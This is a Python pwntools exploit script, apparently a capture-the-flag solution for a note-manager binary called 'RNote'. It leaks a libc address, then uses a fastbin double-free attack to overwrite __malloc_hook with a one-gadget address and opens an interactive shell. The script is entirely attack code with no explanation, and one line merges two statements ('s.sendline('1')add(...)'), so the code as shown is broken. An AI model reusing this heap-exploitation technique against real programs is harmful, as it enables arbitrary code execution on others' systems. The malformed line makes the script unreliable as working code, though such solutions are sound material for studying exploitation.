from pwn import *

s = process('./RNote')

def add(size, title, content):
	s.recvuntil(': ')
	s.sendline('1')
	s.recvuntil(': ')
	s.sendline(size)
	s.recvuntil(': ')
	s.sendline(title)
	s.recvuntil(': ')
	s.send(content)

def delete(index):
	s.recvuntil(': ')
	s.sendline('2')
	s.recvuntil(': ')
	s.sendline(index)

def show(index):
	s.recvuntil(': ')
	s.sendline('3')
	s.recvuntil(': ')
	s.sendline(index)
  
s.sendline('1')add('200','A','A')
add('200','A','A')
delete('0')
add('200','A','A')
show('0')
s.recvuntil('note content: A')
libc_base = u64(s.recv(16)[7:15])-104-0x3c3b10
malloc_hook = libc_base + 0x3c3b10
oneshot = libc_base + 0xf0567
log.info("LIBC BASE : " + hex(libc_base))
log.info("MALLOC HOOK : " + hex(malloc_hook))

delete('0')
delete('1')

add('96','A','A')
add('96','A','A')
add('96','A' * 16 +'\x10' ,'A')
delete('0')
delete('1')
delete('2')
add('96','A',p64(malloc_hook-0x1b-0x8))
add('96','A','A')
add('96','A',p64(malloc_hook-0x1b-0x8))
add('96','A','A' * 19 + p64(oneshot))

s.recvuntil('Your choice:')
s.sendline('1')
s.recvuntil('Please input the note size:')
s.sendline('1')
s.success('GOT SHELL!')
s.interactive()
